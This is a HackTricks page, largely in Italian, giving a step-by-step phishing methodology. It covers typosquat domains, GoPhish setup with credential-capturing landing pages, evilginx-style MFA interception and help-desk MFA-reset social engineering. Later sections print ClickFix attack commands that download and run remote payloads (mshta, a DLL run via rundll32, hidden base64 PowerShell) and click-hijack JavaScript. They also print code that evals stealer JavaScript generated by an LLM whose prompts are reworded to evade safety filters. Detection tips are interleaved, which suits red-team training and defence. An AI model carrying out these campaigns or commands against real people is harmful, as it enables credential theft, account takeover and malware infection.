# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Recon il victim
1. Seleziona il **victim domain**.
2. Esegui una basic web enumeration **cercando i login portals** usati dal victim e **decidi** quale **impersonare**.
3. Usa un po' di **OSINT** per **trovare email**.
2. Prepara l'ambiente
1. **Compra il domain** che userai per la phishing assessment
2. **Configura i record** del servizio email associato (SPF, DMARC, DKIM, rDNS)
3. Configura la VPS con **gophish**
3. Prepara la campaign
1. Prepara il **email template**
2. Prepara la **web page** per rubare le credentials
4. Avvia la campaign!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: Il domain name **contiene** una **keyword** importante del domain originale (e.g., zelster.com-management.com).
- **hypened subdomain**: Cambia il **dot con un hyphen** di un subdomain (e.g., www-zelster.com).
- **New TLD**: Stesso domain usando un **new TLD** (e.g., zelster.org)
- **Homoglyph**: Sostituisce una lettera nel domain name con **letters that look similar** (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Scambia due lettere all'interno del domain name (e.g., zelsetr.com).
- **Singularization/Pluralization**: Aggiunge o rimuove “s” alla fine del domain name (e.g., zeltsers.com).
- **Omission**: Rimuove una delle lettere dal domain name (e.g., zelser.com).
- **Repetition:** Ripete una delle lettere nel domain name (e.g., zeltsser.com).
- **Replacement**: Come homoglyph ma meno stealthy. Sostituisce una delle lettere nel domain name, magari con una lettera vicina a quella originale sulla keyboard (e.g, zektser.com).
- **Subdomained**: Introduce un **dot** all'interno del domain name (e.g., ze.lster.com).
- **Insertion**: Inserisce una lettera nel domain name (e.g., zerltser.com).
- **Missing dot**: Aggiunge il TLD al domain name. (e.g., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

There is a **possibility that one of some bits stored or in communication might get automatically flipped** due to various factors like solar flares, cosmic rays, or hardware errors.

When this concept is **applied to DNS requests**, it is possible that the **domain received by the DNS server** is not the same as the domain initially requested.

For example, a single bit modification in the domain "windows.com" can change it to "windnws.com."

Attackers may **take advantage of this by registering multiple bit-flipping domains** that are similar to the victim's domain. Their intention is to redirect legitimate users to their own infrastructure.

For more information read [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

You can search in [https://www.expireddomains.net/](https://www.expireddomains.net) for a expired domain that you could use.\
In order to make sure that the expired domain that you are going to buy **has already a good SEO** you could search how is it categorized in:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

In order to **discover more** valid email addresses or **verify the ones** you have already discovered you can check if you can brute-force them smtp servers of the victim. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Moreover, don't forget that if the users use **any web portal to access their mails**, you can check if it's vulnerable to **username brute force**, and exploit the vulnerability if possible.

## Configuring GoPhish

### Installation

You can download it from [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Download and decompress it inside `/opt/gophish` and execute `/opt/gophish/gophish`\
You will be given a password for the admin user in port 3333 in the output. Therefore, access that port and use those credentials to change the admin password. You may need to tunnel that port to local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configurazione

**Configurazione del certificato TLS**

Prima di questo passo dovresti aver **già acquistato il dominio** che userai e deve essere **puntato** all'**IP della VPS** in cui stai configurando **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Configurazione Mail**

Inizia installando: `apt-get install postfix`

Poi aggiungi il dominio ai seguenti file:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Cambia anche i valori delle seguenti variabili dentro /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Infine modifica i file **`/etc/hostname`** e **`/etc/mailname`** con il nome del tuo dominio e **riavvia il tuo VPS.**

Ora, crea un **record DNS A** di `mail.<domain>` che punti all'**indirizzo IP** del VPS e un **record DNS MX** che punti a `mail.<domain>`

Ora proviamo a inviare un'email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Configurazione di Gophish**

Arresta l'esecuzione di gophish e configuralo.\
Modifica `/opt/gophish/config.json` con quanto segue (nota l'uso di https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Configurare il servizio gophish**

Per creare il servizio gophish in modo che possa essere avviato automaticamente e gestito come un servizio, puoi creare il file `/etc/init.d/gophish` con il seguente contenuto:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Finisci di configurare il servizio e verifica che funzioni facendo:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Configurazione del mail server e del domain

### Wait & be legit

Più un domain è vecchio, meno è probabile che venga segnalato come spam. Quindi dovresti aspettare il più a lungo possibile (almeno 1 week) prima della phishing assessment. moreover, se metti una page su un settore reputazionale, la reputation ottenuta sarà migliore.

Nota che anche se devi aspettare una week puoi finire di configurare tutto adesso.

### Configure Reverse DNS (rDNS) record

Imposta un record rDNS (PTR) che risolva l'IP address del VPS nel nome del domain.

### Sender Policy Framework (SPF) Record

Devi **configure a SPF record for the new domain**. Se non sai cos'è un SPF record [**leggi questa page**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Puoi usare [https://www.spfwizard.net/](https://www.spfwizard.net) per generare la tua policy SPF (usa l'IP della macchina VPS)

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

Questo è il content che deve essere impostato all'interno di un record TXT dentro il domain:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record

Devi **configurare un record DMARC per il nuovo dominio**. Se non sai cos'è un record DMARC [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Devi creare un nuovo record DNS TXT che punti all'hostname `_dmarc.<domain>` con il seguente contenuto:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Devi **configurare un DKIM per il nuovo dominio**. Se non sai cos'è un record DMARC [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Questo tutorial è basato su: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Devi concatenare entrambi i valori B64 che la chiave DKIM genera:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Testa il punteggio della configurazione email

Puoi farlo usando [https://www.mail-tester.com/](https://www.mail-tester.com)\
Accedi semplicemente alla pagina e invia un'email all'indirizzo che ti forniscono:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Puoi anche **verificare la configurazione della tua email** inviando un'email a `check-auth@verifier.port25.com` e **leggendo la risposta** (per questo dovrai **aprire** la porta **25** e vedere la risposta nel file _/var/mail/root_ se invii l'email come root).\
Verifica di superare tutti i test:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Potresti anche inviare un **messaggio a un Gmail sotto il tuo controllo**, e controllare le **intestazioni dell’email** nella tua inbox Gmail; `dkim=pass` dovrebbe essere presente nel campo di intestazione `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removing from Spamhouse Blacklist

La pagina [www.mail-tester.com](https://www.mail-tester.com) può indicarti se il tuo dominio viene bloccato da spamhouse. Puoi richiedere la rimozione del tuo dominio/IP su: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removing from Microsoft Blacklist

​​Puoi richiedere la rimozione del tuo dominio/IP su [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- Imposta un **nome per identificare** il profilo del mittente
- Decidi da quale account inviare le email di phishing. Suggerimenti: _noreply, support, servicedesk, salesforce..._
- Puoi lasciare vuoti username e password, ma assicurati di selezionare Ignore Certificate Errors

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Si consiglia di usare la funzionalità "**Send Test Email**" per verificare che tutto funzioni.\
> Consiglierei di **inviare le email di test a indirizzi 10min mail** per evitare di essere inseriti in blacklist durante i test.

### Email Template

- Imposta un **nome per identificare** il template
- Poi scrivi un **oggetto** (niente di strano, solo qualcosa che ti aspetteresti di leggere in una email normale)
- Assicurati di aver selezionato "**Add Tracking Image**"
- Scrivi il **template dell'email** (puoi usare variabili come nell'esempio seguente):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note che **per aumentare la credibilità dell'email**, è consigliato usare qualche signature da un'email del client. Suggerimenti:

- Invia un'email a un **indirizzo inesistente** e verifica se la risposta ha qualche signature.
- Cerca **email pubbliche** come info@ex.com o press@ex.com o public@ex.com e invia loro un'email, poi attendi la risposta.
- Prova a contattare **qualche email valida scoperta** e attendi la risposta

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> L'Email Template permette anche di **allegare file da inviare**. Se vuoi anche rubare NTLM challenges usando file/documenti appositamente creati [leggi questa pagina](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Scrivi un **nome**
- **Scrivi il codice HTML** della pagina web. Nota che puoi **importare** pagine web.
- Seleziona **Capture Submitted Data** e **Capture Passwords**
- Imposta un **redirection**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Di solito dovrai modificare il codice HTML della pagina e fare alcuni test in locale (magari usando un server Apache) **finché non ti piacciono i risultati.** Poi, scrivi quel codice HTML nella casella.\
> Nota che se devi **usare risorse statiche** per l'HTML (magari alcune pagine CSS e JS) puoi salvarle in _**/opt/gophish/static/endpoint**_ e poi accedervi da _**/static/\<filename>**_

> [!TIP]
> Per il redirection potresti **reindirizzare gli utenti alla pagina web principale legittima** della vittima, oppure reindirizzarli a _/static/migration.html_ per esempio, mettere una **spinning wheel (**[**https://loading.io/**](https://loading.io)**) per 5 secondi e poi indicare che il processo è stato completato**.

### Users & Groups

- Imposta un nome
- **Importa i dati** (nota che per usare il template dell'esempio ti servono il firstname, last name e email address di ogni utente)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Infine, crea una campaign selezionando un nome, l'email template, la landing page, la URL, il sending profile e il group. Nota che la URL sarà il link inviato alle vittime

Nota che il **Sending Profile permette di inviare un test email per vedere come apparirà la email finale di phishing**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> Ti consiglierei di **inviare le test emails a indirizzi 10min mails** per evitare di essere inserito in blacklist mentre fai test.

Una volta che tutto è pronto, avvia semplicemente la campaign!

## Website Cloning

Se per qualche motivo vuoi clonare il website, controlla la seguente pagina:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

In alcune phishing assessments (soprattutto per Red Teams) vorrai anche **inviare file contenenti una sorta di backdoor** (magari un C2 o magari solo qualcosa che attivi un'autenticazione).\
Controlla la seguente pagina per alcuni esempi:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

L'attacco precedente è piuttosto intelligente perché stai falsificando un sito web reale e raccogliendo le informazioni inserite dall'utente. Purtroppo, se l'utente non ha inserito la password corretta o se l'applicazione che hai falsificato è configurata con 2FA, **queste informazioni non ti permetteranno di impersonare l'utente ingannato**.

È qui che strumenti come [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) e [**muraena**](https://github.com/muraenateam/muraena) sono utili. Questo tool ti permetterà di generare un attacco simile a un MitM. In pratica, l'attacco funziona nel seguente modo:

1. Tu **impersoni il login** form della vera pagina web.
2. L'utente **invia** le sue **credentials** alla tua pagina fake e il tool le invia alla vera pagina web, **verificando se le credenziali funzionano**.
3. Se l'account è configurato con **2FA**, la pagina MitM lo richiederà e, una volta che l'**utente lo inserisce**, il tool lo invierà alla vera web page.
4. Una volta che l'utente è autenticato, tu (come attacker) avrai **catturato le credentials, il 2FA, il cookie e qualsiasi informazione** di ogni interazione mentre il tool esegue un MitM.

### Via VNC

E se invece di **inviare la vittima a una pagina malevola** con lo stesso aspetto dell'originale, la mandi a una **sessione VNC con un browser connesso alla vera web page**? Potrai vedere cosa fa, rubare la password, il MFA usato, i cookie...\
Puoi fare questo con [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Ovviamente uno dei modi migliori per sapere se sei stato scoperto è **cercare il tuo domain nelle blacklist**. Se appare elencato, in qualche modo il tuo domain è stato rilevato come sospetto.\
Un modo semplice per verificare se il tuo domain appare in qualche blacklist è usare [https://malwareworld.com/](https://malwareworld.com)

Tuttavia, ci sono altri modi per capire se la vittima sta **cercando attivamente attività phishing sospette nel mondo reale** come spiegato in:


{{#ref}}
detecting-phising.md
{{#endref}}

Puoi **comprare un domain con un nome molto simile** al domain della vittima **e/o generare un certificato** per un **subdomain** di un domain controllato da te **contenente** la **keyword** del domain della vittima. Se la **vittima** esegue qualsiasi tipo di interazione **DNS o HTTP** con essi, saprai che **sta cercando attivamente** domain sospetti e dovrai essere molto stealth.

### Evaluate the phishing

Usa [**Phishious** ](https://github.com/Rices/Phishious)per valutare se la tua email finirà nella cartella spam oppure se verrà bloccata o andrà a buon fine.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

I modern intrusion sets saltano sempre più spesso del tutto i lures via email e **colpiscono direttamente il service-desk / identity-recovery workflow** per aggirare MFA. L'attacco è completamente "living-off-the-land": una volta che l'operatore ottiene credenziali valide, si sposta usando tool di amministrazione integrati – non è richiesto malware.

### Attack flow
1. Recon della vittima
* Raccogli dettagli personali e aziendali da LinkedIn, data breach, GitHub pubblici, ecc.
* Identifica identità di alto valore (executive, IT, finance) ed enumera l'**esatto help-desk process** per il reset di password / MFA.
2. Social engineering in tempo reale
* Chiama, usa Teams o chatta con l'help-desk impersonando il target (spesso con **spoofed caller-ID** o **cloned voice**).
* Fornisci le PII raccolte in precedenza per superare la verifica basata sulla conoscenza.
* Convince l'agente a **resettare il segreto MFA** o a eseguire un **SIM-swap** su un numero mobile registrato.
3. Azioni immediate post-accesso (≤60 min in casi reali)
* Stabilisci un foothold tramite qualsiasi portale web SSO.
* Enumera AD / AzureAD con strumenti integrati (nessun binary rilasciato):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateral movement con **WMI**, **PsExec**, o agenti **RMM** legittimi già consentiti nell'ambiente.

### Detection & Mitigation
* Tratta il help-desk identity recovery come un'**operazione privilegiata** – richiedi step-up auth e approvazione del manager.
* Distribuisci regole di **Identity Threat Detection & Response (ITDR)** / **UEBA** che segnalino:
* Cambio del metodo MFA + autenticazione da nuovo device / geo.
* Elevazione immediata dello stesso principal (user-→-admin).
* Registra le chiamate dell'help-desk e imponi un **richiamo a un numero già registrato** prima di qualsiasi reset.
* Implementa **Just-In-Time (JIT) / Privileged Access** in modo che gli account appena resettati non ereditino automaticamente token ad alto privilegio.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
I gruppi commodity compensano il costo delle operazioni high-touch con attacchi di massa che trasformano **search engines & ad networks nel canale di delivery**.

1. **SEO poisoning / malvertising** spinge in cima agli annunci di ricerca un risultato falso come `chromium-update[.]site`.
2. La vittima scarica un piccolo **first-stage loader** (spesso JS/HTA/ISO). Esempi osservati da Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Il loader esfiltra i cookie del browser + i credential DB, poi scarica un **silent loader** che decide – *in realtime* – se distribuire:
* RAT (e.g. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Blocca i domain appena registrati e applica **Advanced DNS / URL Filtering** su *search-ads* oltre che sulle email.
* Limita l'installazione software a pacchetti MSI / Store firmati, nega l'esecuzione di `HTA`, `ISO`, `VBS` tramite policy.
* Monitora i child processes dei browser che aprono installer:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Cerca i LOLBins spesso abusati dai first-stage loaders (e.g. `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Alcuni portali fake per software mantengono il visibile download `href` puntato alla URL GitHub/release **reale** ma dirottano la **prima** interazione dell'utente in JavaScript e inviano la vittima invece in una catena **Traffic Distribution System (TDS)**.
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Key traits:
- Il hook di solito gira nella **capture phase** (`true`) su `document`, quindi scatta prima degli handler del sito.
- Chrome spesso usa `mousedown` invece di `click` per mantenere il redirect legato a un valido **user gesture** e migliorare il bypass del popup-blocker.
- Alcune varianti pre-aprono `about:blank` o sintetizzano click su `<a target="_blank">` e solo dopo assegnano l'URL del TDS.
- I cap lato browser spesso vivono in `localStorage`, quindi il **first click** può arrivare al malware mentre refresh/ripetizioni tornano al link visibile apparentemente benigno.
- Il TDS può fare gating per referrer, entry domain, GEO, fingerprint del browser/device, controlli VPN/datacenter, click context e contatori per-sessione, rendendo i replay dell'analista non deterministici.

Defender ideas:
- Confronta l'`href` **mostrato** con il target di navigazione **effettivo** generato al momento del click.
- Cerca handler `document.addEventListener(..., true)` che chiamano sia `preventDefault()` sia `stopImmediatePropagation()` attorno a `window.open`, `about:blank` o click sintetici su anchor.
- Considera cluster di domini di download software appena registrati che caricano tutti lo stesso stage CloudFront/JS come un pattern ad alto segnale di SEO-poisoning/TDS.

### ClickFix from fake verification pages + archive-looking LOLBAS fetches
Some TDS branches end in a fake verification page (Cloudflare/IUAM style) that tells the victim to run a trusted Windows binary such as:
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Notes:
- `mshta.exe` esegue il **HTA/VBScript all'inizio della risposta**, anche se l'URL finge di essere un archivio `.7z`; i dati dell'archivio aggiunti in coda possono essere puro decoy.
- Le fasi successive spesso continuano a mentire sul tipo di file (`.rtf` per PowerShell, `.asar` per Python, ZIP con binari appesantiti) e poi passano a **manual PE mapping / esecuzione in-memory**.
- Se stai rispondendo a una di queste catene, preserva **network + memory dalla prima esecuzione riuscita**: i replay successivi possono mostrare solo un percorso benigno installer/SFX oppure fallire perché il payload/key release era vincolato alla sessione TDS originale.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: advisory CERT nazionale clonato con un pulsante **Update** che mostra istruzioni “fix” passo per passo. Alle vittime viene detto di eseguire un batch che scarica una DLL e la esegue tramite `rundll32`.
* Tipica chain batch osservata:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` deposita il payload in `%TEMP%`, una breve pausa nasconde il jitter di rete, poi `rundll32` richiama l'entrypoint esportato (`notepad`).
* La DLL effettua beacon dell'identità dell'host e interroga il C2 ogni pochi minuti. Il tasking remoto arriva come **base64-encoded PowerShell** eseguito nascosto e con policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Questo mantiene la flessibilità del C2 (il server può cambiare i task senza aggiornare la DLL) e nasconde le finestre della console. Cerca figli PowerShell di `rundll32.exe` usando `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` insieme.
* I defender possono cercare callback HTTP(S) nel formato `...page.php?tynor=<COMPUTER>sss<USER>` e intervalli di polling di 5 minuti dopo il caricamento della DLL.

---

## AI-Enhanced Phishing Operations
Gli attaccanti ora concatenano **LLM & voice-clone APIs** per lure completamente personalizzate e interazione in tempo reale.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generare & inviare >100 k email / SMS con wording randomizzato & tracking links.|
|Generative AI|Produrre email *one-off* che fanno riferimento a M&A pubbliche, inside jokes dai social media; voce CEO deep-fake in callback scam.|
|Agentic AI|Registrare autonomamente domini, fare scraping di open-source intel, creare le mail della fase successiva quando una vittima clicca ma non invia credenziali.|

**Defence:**
• Aggiungi **dynamic banners** che evidenzino i messaggi inviati da automazione non affidabile (tramite anomalie ARC/DKIM).
• Implementa **voice-biometric challenge phrases** per richieste telefoniche ad alto rischio.
• Simula continuamente lure generate da AI nei programmi di awareness – i template statici sono obsoleti.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Gli attaccanti possono distribuire HTML dall'aspetto benigno e **generare lo stealer at runtime** chiedendo a una **trusted LLM API** JavaScript, poi eseguendolo nel browser (ad esempio `eval` o `<script>` dinamico).

1. **Prompt-as-obfuscation:** codificare gli URL di esfiltrazione/stringhe Base64 nel prompt; iterare il wording per aggirare i safety filters e ridurre le hallucinations.
2. **Client-side API call:** al caricamento, JS chiama un LLM pubblico (Gemini/DeepSeek/etc.) o un CDN proxy; nel file HTML statico è presente solo il prompt/chiamata API.
3. **Assemble & exec:** concatenare la risposta ed eseguirla (polimorfica per ogni visita):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** il codice generato personalizza l'esca (ad esempio, parsing del token di LogoKit) e invia le credenziali all'endpoint nascosto nel prompt.

**Caratteristiche di evasione**
- Il traffico raggiunge domini LLM ben noti o proxy CDN affidabili; a volte tramite WebSockets verso un backend.
- Nessun payload statico; il JavaScript malevolo esiste solo dopo il render.
- Generazioni non deterministiche producono **stealer** unici per sessione.

**Idee di detection**
- Esegui sandbox con JavaScript abilitato; segnala **`eval`/creazione dinamica di script a runtime proveniente da risposte LLM**.
- Cerca POST front-end verso API LLM immediatamente seguiti da `eval`/`Function` sul testo restituito.
- Genera alert su domini LLM non autorizzati nel traffico client, seguiti da POST di credenziali.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Oltre al classico push-bombing, gli operatori semplicemente **forzano una nuova registrazione MFA** durante la chiamata all'help-desk, annullando il token esistente dell'utente. Qualsiasi successivo prompt di login appare legittimo alla vittima.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitorare eventi AzureAD/AWS/Okta in cui **`deleteMFA` + `addMFA`** avvengono **entro pochi minuti dallo stesso IP**.



## Clipboard Hijacking / Pastejacking

Gli attacker possono copiare silenziosamente comandi malevoli negli appunti della vittima da una pagina web compromessa o typosquatted e poi ingannare l’utente per incollarli dentro **Win + R**, **Win + X** o una finestra del terminale, eseguendo codice arbitrario senza alcun download o allegato.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* Una lure page (ad esempio, un finto canale ministry/CERT) mostra un QR di WhatsApp Web/Desktop e istruisce la vittima a scansionarlo, aggiungendo silenziosamente l’attacker come **linked device**.
* L’attacker ottiene subito visibilità su chat/contatti finché la sessione non viene rimossa. Le vittime possono in seguito vedere una notifica di “new device linked”; i defender possono cercare eventi di device-link inaspettati poco dopo visite a pagine QR non attendibili.

### Mobile‑gated phishing to evade crawlers/sandboxes
Gli operatori stanno sempre più spesso mettendo i propri flussi di phishing dietro un semplice controllo del dispositivo, così i crawler desktop non raggiungono mai le pagine finali. Un pattern comune è un piccolo script che verifica la presenza di un DOM con supporto touch e invia il risultato a un endpoint del server; i client non mobile ricevono HTTP 500 (o una pagina vuota), mentre agli utenti mobile viene servito il flusso completo.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logica (semplificata):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Comportamento del server spesso osservato:
- Imposta un session cookie durante il primo caricamento.
- Accetta `POST /detect {"is_mobile":true|false}`.
- Restituisce 500 (o placeholder) alle GET successive quando `is_mobile=false`; serve il phishing solo se `true`.

Heuristiche di hunting e detection:
- query urlscan: `filename:"detect_device.js" AND page.status:500`
